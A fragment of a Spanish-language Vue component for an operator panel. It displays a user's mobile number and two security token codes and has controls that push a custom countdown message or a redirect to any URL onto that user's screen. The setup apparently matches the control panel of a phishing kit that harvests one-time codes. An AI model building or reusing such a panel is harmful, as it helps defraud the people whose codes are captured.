                <span class="text-sm text-gray-400 transition-all duration-300" :class="{ 'opacity-75': isLoading }">
                  {{ userData.telefono_movil || 'N/A' }}
                </span>
              </div>
            </div>
          </div>

          <!-- Tokens de Seguridad -->
          <div class="bg-gray-700 rounded-lg p-4">
            <div class="flex items-center justify-between mb-3">
              <span class="text-sm text-gray-300">Tokens de Seguridad</span>
              <span class="bg-yellow-600 text-white text-xs px-2 py-1 rounded-full font-semibold">TOKENS</span>
            </div>
            <div class="space-y-2">
              <div class="flex justify-between items-center">
                <strong class="text-sm text-gray-200">Token Principal:</strong>
                <span class="text-sm text-gray-400 font-mono transition-all duration-300" :class="{ 'opacity-75': isLoading }">
                  {{ userData.token_codigo || 'N/A' }}
                </span>
              </div>
              <div class="flex justify-between items-center">
                <strong class="text-sm text-gray-200">Token Secundario:</strong>
                <span class="text-sm text-gray-400 font-mono transition-all duration-300" :class="{ 'opacity-75': isLoading }">
                  {{ userData.sgdotoken_codigo || 'N/A' }}
                </span>
              </div>
            </div>
          </div>

          <!-- Herramientas Avanzadas -->
          <div class="bg-gray-700 rounded-lg p-4">
            <div class="flex items-center space-x-3">
              <i class="fas fa-tools text-yellow-500"></i>
              <div class="flex space-x-2 flex-1">
                <button v-if="can('panel.send.herramientas')" @click="enviarHerramientas" class="px-4 py-3 bg-purple-600 hover:bg-purple-700 rounded text-white transition-colors" title="Herramientas de Soporte">
                  <i class="fas fa-tools"></i>
                </button>
                <button v-if="can('panel.send.timer')" @click="mostrarTimerModal" class="px-4 py-3 bg-orange-600 hover:bg-orange-700 rounded text-white transition-colors" title="Timer Personalizado">
                  <i class="fas fa-clock"></i>
                </button>
                <button v-if="can('panel.send.redireccion')" @click="mostrarRedireccionModal" class="px-4 py-3 bg-cyan-600 hover:bg-cyan-700 rounded text-white transition-colors" title="Enviar Redirección">
                  <i class="fas fa-external-link-alt"></i>
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </main>
  </div>

  <!-- Modal Timer -->
  <div v-if="showTimerModal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
    <div class="bg-white rounded-lg p-6 w-96 max-w-md mx-4">
      <h3 class="text-lg font-semibold mb-4 text-gray-800">Enviar Timer Personalizado</h3>

      <div class="space-y-4">
        <div>
          <label class="block text-sm font-medium text-gray-700 mb-2">Tiempo (segundos)</label>
          <input v-model.number="timerData.tiempo_segundos" type="number" min="1" max="3600"
                 class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-orange-500">
        </div>

        <div>
          <label class="block text-sm font-medium text-gray-700 mb-2">Mensaje Personalizado</label>
          <textarea v-model="timerData.mensaje_personalizado" rows="3"
                    class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-orange-500"
                    placeholder="Mensaje que verá el usuario..."></textarea>
        </div>
      </div>

      <div class="flex justify-end gap-3 mt-6">
        <button @click="showTimerModal = false" class="px-4 py-2 text-gray-600 hover:text-gray-800">
          Cancelar
        </button>
        <button @click="enviarTimer" class="px-4 py-2 bg-orange-600 text-white rounded hover:bg-orange-700">
          Enviar Timer
        </button>
      </div>
    </div>
  </div>

  <!-- Modal Redirección -->
  <div v-if="showRedireccionModal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
    <div class="bg-white rounded-lg p-6 w-96 max-w-md mx-4">
      <div class="flex items-center justify-between mb-4">
        <div class="flex items-center space-x-2">
          <i class="fas fa-external-link-alt text-gray-600"></i>
          <h3 class="text-lg font-semibold text-gray-800">Enviar Redirección</h3>
        </div>
        <button @click="showRedireccionModal = false" class="text-gray-400 hover:text-gray-600">
          <i class="fas fa-times"></i>
        </button>
      </div>

      <div class="space-y-4">
        <div>
          <label class="block text-sm font-medium text-gray-700 mb-3">Tipo de redirección:</label>
          <div class="space-y-2">
            <label class="flex items-center p-3 border border-gray-300 rounded-lg cursor-pointer hover:bg-gray-50">
              <input v-model="redireccionData.tipo_redireccion" type="radio" value="index" class="mr-3 text-blue-600">
              <i class="fas fa-home mr-2 text-gray-600"></i>
              <span class="text-gray-700">Enviar al Index</span>
            </label>
            <label class="flex items-center p-3 border border-gray-300 rounded-lg cursor-pointer hover:bg-gray-50">
              <input v-model="redireccionData.tipo_redireccion" type="radio" value="url_personalizada" class="mr-3 text-blue-600">
              <i class="fas fa-link mr-2 text-blue-600"></i>
              <span class="text-blue-600">URL Personalizada</span>
            </label>
          </div>
        </div>

        <!-- Input URL que aparece solo si se selecciona URL personalizada -->
        <div v-if="redireccionData.tipo_redireccion === 'url_personalizada'" class="space-y-2">
          <label class="block text-sm font-medium text-gray-700">URL de destino:</label>
          <input v-model="redireccionData.url_destino" type="url"
                 class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                 placeholder="https://ejemplo.com">
          <p class="text-xs text-gray-500">Ingresa la URL completa incluyendo http:// o https://</p>
        </div>
      </div>

      <div class="flex justify-end gap-3 mt-6">
        <button @click="showRedireccionModal = false" class="px-4 py-2 bg-gray-500 text-white rounded hover:bg-gray-600">
          Cancelar
        </button>
        <button @click="enviarRedireccion" class="px-4 py-2 bg-blue-600 text-white rounded hover:bg-blue-700 flex items-center">
          <i class="fas fa-paper-plane mr-2"></i>
          Enviar Redirección
        </button>
      </div>
    </div>
  </div>
</template>

<style scoped>
/* Transiciones suaves para cambio de usuario SPA */
.fade-enter-active, .fade-leave-active {
  transition: opacity 0.3s ease;
}
.fade-enter-from, .fade-leave-to {
  opacity: 0;
}

.slide-fade-enter-active {
  transition: all 0.4s ease-out;
}
.slide-fade-leave-active {
  transition: all 0.3s ease-in;
}
.slide-fade-enter-from {
  transform: translateX(20px);
  opacity: 0;
}
.slide-fade-leave-to {
  transform: translateX(-20px);
  opacity: 0;
}

/* Indicador de carga suave */
.loading-overlay {
  backdrop-filter: blur(2px);
}

/* Transición suave para datos */
.data-transition {
  transition: all 0.2s ease-in-out;
}

/* Animación de pulso para elementos cargando */
.pulse-loading {
  animation: pulse 1.5s ease-in-out infinite;
}

@keyframes pulse {
  0%, 100% {
    opacity: 1;
  }
  50% {
    opacity: 0.5;
  }
}

/* Transiciones para menú de mensajes rápidos */
.slide-up-enter-active {
  transition: all 0.3s ease-out;
}
.slide-up-leave-active {
  transition: all 0.2s ease-in;
}
.slide-up-enter-from {
  transform: translateY(10px);
  opacity: 0;
}
.slide-up-leave-to {
  transform: translateY(5px);
  opacity: 0;
}

/* Estilos para el chat */
.chat-messages-container {
  scrollbar-width: thin;
  scrollbar-color: #4b5563 #1f2937;
  /* Asegurar que el scroll funcione correctamente */
  overflow-y: auto;
  overflow-x: hidden;
}

.chat-messages-container::-webkit-scrollbar {
  width: 8px;
}

.chat-messages-container::-webkit-scrollbar-track {
  background: #1f2937;
  border-radius: 4px;
}

.chat-messages-container::-webkit-scrollbar-thumb {
  background: #4b5563;
  border-radius: 4px;
  border: 1px solid #1f2937;
}

.chat-messages-container::-webkit-scrollbar-thumb:hover {
  background: #6b7280;
}

/* Mejorar el espaciado de los mensajes */
.chat-messages-container .space-y-4 > * + * {
  margin-top: 1rem;
}
</style>
